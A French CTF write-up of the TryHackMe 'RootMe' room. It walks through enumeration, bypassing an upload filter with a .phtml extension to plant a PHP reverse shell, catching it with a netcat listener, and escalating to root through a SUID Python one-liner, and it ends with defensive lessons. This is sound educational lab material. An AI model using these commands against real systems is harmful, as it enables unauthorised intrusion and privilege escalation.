---
title: "CTF - RootMe"
date: 2026-02-19
categories: [tryhackme]
tags: [webexploitation,privilege-escalation,revershell,php,SUID,python]
image: /assets/img/writeups/rootme/rootme.png
---

### Introduction
La room [RootMe](https://tryhackme.com/room/rrootme) proposée sur TryHackMe s’inscrit dans une démarche classique de test d’intrusion. L’objectif est d’aboutir à la compromission complète du système, en démontrant la chaîne d’attaque depuis la phase d’énumération jusqu’à l’élévation de privilèges.

--- 
### Phase d’énumération

Scan Nmap :

```shell
$ nmap -p- -sC -sV -Pn 10.82.134.107 -oN scan-nmap.txt

# Nmap 7.98 scan initiated Sun Feb 22 12:27:33 2026 as: /usr/lib/nmap/nmap -p- -sC -sV -Pn -on 10.82.134.107 nmap-scan.txt
Failed to resolve "nmap-scan.txt".
Nmap scan report for 10.82.134.107
Host is up (0.047s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 17:d4:4a:7d:89:d9:6a:e8:dd:de:9a:89:df:ca:5d:93 (RSA)
|   256 5e:cf:49:6c:e3:67:94:32:73:1b:ce:a4:bc:54:5f:89 (ECDSA)
|_  256 1a:ea:3c:80:c9:6c:2e:75:8b:64:80:ce:67:3b:5c:4f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: HackIT - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 22 12:28:20 2026 -- 1 IP address (1 host up) scanned in 46.94 seconds

```  
`-p-` : scanne l’ensemble des 65535 ports    
`-sC` : exécute les scripts par défaut      
`-sV` : détecte les versions des services      
`-Pn` : ignore le ping initial (utile si l’hôte bloque les ICMP)      

<u>Il y a 2 ports ouverts :</u>      

- **22 (SSH)**   
Un service SSH est actif. Il pourrait être exploitable si des identifiants valides sont obtenus.

- **80 (HTTP)**  
Un serveur web Apache est accessible. Il mérite une analyse approfondie afin d’identifier d’éventuelles vulnérabilités ou informations sensibles.

---

Je poursuis donc par l’analyse du service HTTP sur le port 80, les applications web constituant fréquemment un point d’entrée lors d’un test d’intrusion.

---

### Web exploitation
En accédant au site web, je découvre une page vitrine affichant le message *“Can you root me”*, laissant supposer un challenge orienté exploitation.
J’analyse alors le code source HTML **(CTRL + Shift + I)** ainsi que les différents onglets des outils de développement afin de repérer un éventuel indice ou une faiblesse exploitable. 

Cependant, cette première inspection ne révèle aucun élément intéressant. 
Suite à cette analyse visuelle infructueuse, j’utilise **Feroxbuster** afin d’effectuer une recherche de répertoires et fichiers cachés sur le serveur web :

```bash
$ feroxbuster -u http://10.82.134.107        
                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.82.134.107/
 🚩  In-Scope Url          │ 10.82.134.107
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      100l      161w     1611c http://10.82.134.107/css/panel.css
301      GET        9l       28w      312c http://10.82.134.107/uploads => http://10.82.134.107/uploads/
301      GET        9l       28w      310c http://10.82.134.107/panel => http://10.82.134.107/panel/
301      GET        9l       28w      307c http://10.82.134.107/js => http://10.82.134.107/js/
200      GET       11l       22w      263c http://10.82.134.107/js/maquina_de_escrever.js
301      GET        9l       28w      308c http://10.82.134.107/css => http://10.82.134.107/css/
200      GET      105l      188w     1697c http://10.82.134.107/css/home.css
200      GET       25l       44w      616c http://10.82.134.107/
[####################] - 81s    60012/60012   0s      found:8       errors:0      
[####################] - 79s    30000/30000   380/s   http://10.82.134.107/ 
[####################] - 5s     30000/30000   5848/s  http://10.82.134.107/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   256410/s http://10.82.134.107/uploads/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 76s    30000/30000   392/s   http://10.82.134.107/panel/ 
[####################] - 0s     30000/30000   135135/s http://10.82.134.107/js/ => Directory listing (add --scan-dir-listings to scan) 
```
L’outil révèle plusieurs éléments intéressants : 
- `/panel` 
- `/uploads` 
- `/css` 
- `/js`  

Les répertoires **`/panel`** et **`/uploads`** attirent particulièrement l’attention.
En analysant la page **`/panel`**, on constate la présence d’une fonctionnalité d’upload de fichiers. Le répertoire **`/uploads`**, quant à lui, permet d’accéder aux fichiers téléversés, ce qui suggère que ceux-ci sont directement accessibles depuis le navigateur.

Ce comportement indique une potentielle vulnérabilité d’upload de fichiers, notamment la possibilité de téléverser un fichier PHP malveillant et de l’exécuter sur le serveur.

![Aperçu du site](/assets/img/writeups/rootme/web-panel.png)


### Reverse Shell
> <u>Définition d'un revershell :</u>   
le reverse shell est un outil qui **permet de prendre le contrôle d’une machine cible en utilisant une connexion sortante.** 
"c’est pas nous qui nous connectons directement à la cible, mais la cible qui se connecte à nous", 
car le firewall bloque toute connexion entrante mais permet les connexions sortante. 

**Tentatives d’injection :**    
Le serveur utilise PHP comme langage de script côté serveur, ce qui est confirmé par l’analyse réalisée avec Nmap ainsi que par les résultats de l’énumération. 
Sur la page du *panel*, il est possible de soumettre des fichiers. L’objectif est donc d’y téléverser un reverse shell PHP afin d’obtenir un accès interactif à la machine.

**Problème lié aux extensions :**   
Dans un premier temps, j’ai tenté d’uploader directement un webshell avec une extension classique telle que `.php` ou `.php3`. Cependant <u>ces tentatives ont échoué</u>, ce qui laisse supposer la présence d’un mécanisme de filtrage côté serveur vérifiant les extensions autorisées. L’absence d’information sur les types de fichiers acceptés complique l’injection du script PHP malveillant.

**Solution   :**   
Je savais que pour pouvoir injecter un webshell de manière efficace, il fallait trouver l’extension qui pourrait passer à travers les filtres du serveur. Une méthode rapide pour le faire consiste à essayer différentes extensions de fichier courantes sur les serveurs web PHP.



J’ai donc testé plusieurs extensions alternatives afin de contourner le filtrage mis en place :

- [ ] php5
- [ ] phps
- [ ] php.jpg
- [x] **phtml**
- [ ] php%00.jpg

> **php%00.jpg est une étrange extension !**    
    Le `%00` correspond à l’encodage URL du null byte (\x00), autrefois utilisé pour tronquer le nom du fichier côté serveur 
    et contourner certains filtres d’extensions (ex. `php%00.jpg` sera interprété comme `php`).


Parmi ces tentatives, une seule a été acceptée par le serveur : l’extension `phtml`.  
Cette réussite indique que le serveur interprète toujours les fichiers `.phtml` comme du code PHP exécutable, tout en ne les incluant pas dans la liste des extensions bloquées par le mécanisme de filtrage.


![Aperçu du site](/assets/img/writeups/rootme/rev-shell.png)

Après l’upload du fichier malveillant en `.phtml`, j’ai accédé au répertoire `/uploads` afin de déclencher son exécution et ainsi obtenir un accès à la machine cible.

Avant d’exécuter le script, je me suis placé en écoute sur le port `4444`, préalablement configuré dans mon reverse shell. Une fois le fichier appelé depuis le navigateur, la connexion entrante s’est établie et j’ai pu obtenir un shell sur la machine :

```console
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.160.41] from (UNKNOWN) [10.82.131.85] 36622
Linux ip-10-82-131-85 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 12:47:46 up 20 min,  0 users,  load average: 0.00, 0.00, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ export TERM=xterm
$ which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'
...
```
Après avoir obtenu un accès à la machine, **j’ai commencé par explorer les répertoires susceptibles de contenir des informations sensibles**, notamment :  
- `/home/` : répertoires utilisateurs, fichiers .ssh, éventuels flags ou mots de passe  
- `/etc/` : fichiers sensibles comme passwd, crontab, ou configurations système  
- `/tmp/` : fichiers temporaires potentiellement exploitables  
- `/opt/` : applications ou services installés manuellement  

Cette phase d’énumération manuelle ne m’ayant rien révélé d’exploitable, j’ai opté pour une approche plus directe en recherchant le fichier `user.txt`, qui contient généralement le flag utilisateur.
Pour cela, j’ai utilisé la commande `find` afin de localiser précisément ce fichier sur le système :

```console
bash-5.0$ find / -type f -name user.txt 2> /dev/null
/var/www/user.txt

bash-5.0$ cat /var/www/user.txt
THM{y0xxxxxxxxxxxxxx}
```
- `find /` : Lance la recherche à partir de la racine, donc dans l'ensemble des répertoires  
- `-type`  : Limite la recherche aux fichiers uniquement (exclut les dossiers).  
- `-name user.txt`  : Recherche un fichier dont le nom correspond exactement à `user.txt`  
- `2> /dev/null` : Redirige les messages d’erreur vers `/dev/null` afin de ne pas polluer l'affichage avec des erreurs de permission.  

<span style="color:#00ff99;">FLAG : THM{y0xxxxxxxxxxxxxx}</span>

### Privilege Escalation 
Afin d’obtenir les privilèges **root**, l’énoncé du CTF oriente vers la recherche de fichiers disposant du bit SUID :    
*“Search for files with SUID permission, which file is weird?”*

> **Définition SUID** :   
C’est un **droit spécial sous Linux/Unix** qui s’applique **aux fichiers exécutables** (des programmes).  
Normalement, quand tu lances un programme :
- il s’exécute **avec tes propres droits**
- Avec le **SUID activé** :
    - le programme s’exécute **avec les droits du propriétaire du fichier**,  
    - **pas avec les tiens**  

La présence de Python en SUID constitue une mauvaise configuration grave,   
car Python <span style="color:#f03a3a;">permet l’exécution arbitraire de code.</span> 

<u>Comment reconnaitre un fichier SUID :</u>
```console
$ ls -l
-rwsr-xr-x 1 root root 54256 passwd
...           
```
- Le `s` à la place du `x` indique le SUID.



J’ai donc exécuté la commande suivante afin d’identifier les programmes disposant du bit SUID, 
et pouvant s’exécuter avec les **privilèges root** :

```console
bash-5.0$ find / -type f -perm -4000 2> /dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7                                         <-- Something interesting here !
/usr/bin/at
/usr/bin/chfn
...
```
- `-perm -4000` : Recherche un fichier ayant un bit SUID activé.  
    - `4`   : Le 4 corresponds au bit SUID    
    - `000` : Les 0 concernent les permissions classiques    
    - `-`   : Signifie que le bit 4000 doit être présent.    
 
Cette commande permet de lister tous les fichiers exécutables possédant le **SUID**, donc susceptibles de s’exécuter avec les privilèges de leur propriétaire (souvent root). Parmi les résultats, **j’ai remarqué que Python faisait partie des programmes concernés**, ce qui est potentiellement exploitable.
J’ai alors effectué des recherches afin de déterminer s’il était possible d’obtenir un shell root via ce binaire. Pour cela, j’ai consulté la base de données GTFOBins, qui référence différentes méthodes d’exploitation de binaires légitimes.

Grâce à la commande proposée par [GTFOBins](https://gtfobins.org/gtfobins/python/#shell) pour Python en **SUID**, j’ai pu obtenir un shell avec les privilèges root et ainsi finaliser l’élévation de privilèges.



![Aperçu du site](/assets/img/writeups/rootme/shell-root.png)

```console
bash-5.0$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# whoami
root

# ls
bin    dev   initrd.img      lib64	 mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib	     media	 proc  sbin  swap.img  usr  vmlinuz.old

# cd root	
# ls
root.txt  snap

# cat root.txt	
THM{prxxxxxxxxxxxxxxxxxx}
```
- Explication commande :   
Cette commande lance un shell `/bin/sh` via Python en utilisant <u>os.execl</u> avec   
l’option `-p`, ce qui **permet de conserver les privilèges SUID (root)** et d’obtenir un shell avec les droits élevés.

<span style="color:#00ff99;">FLAG : THM{prxxxxxxxxxxxxxxxxxx}</span>


### Conclusion
Ce challenge met en évidence :
- L'importance de la validation sécurisée des uploads
    - par exemple, on aurait pu **réaliser un filtrage basé sur une "whitelist" complète** plutôt que sur une "blacklist" incomplète
- Les dangers des binaires SUID mal configurés  
    - on aurait également pu supprimer le bit SUID des binaires non essentiels, 
      et **appliquer le principe de moindre privilège**  
- L’importance d’une méthodologie rigoureuse en test d’intrusion  

Une simple faille d’upload combinée à une mauvaise configuration SUID a permis la compromission complète du système.

